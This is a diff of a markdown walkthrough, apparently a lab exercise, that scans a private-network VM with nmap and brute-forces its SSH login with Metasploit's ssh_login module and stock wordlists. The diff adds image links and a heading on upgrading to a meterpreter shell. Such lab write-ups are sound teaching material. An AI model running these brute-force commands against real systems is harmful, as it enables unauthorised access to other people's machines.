@@ -42,7 +42,7 @@ sudo nmap -sS -sV -O 192.168.56.101
 
 we will target SSH_port 22 using Brute_force
 
-```bash
+\```bash
 msfconsole
 use auxiliary/scanner/ssh/ssh_login
 show options
@@ -50,3 +50,12 @@ set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
 set user_file /usr/share/wordlists/metasploit/unix_users.txt
 set rhosts 192.168.56.101
 exploit
+\```
+
+![nmap](./Picture4.png)
+
+---
+
+### **Upgrading the shell to meterpreter:**
+
+![nmap](./Picture5.png)
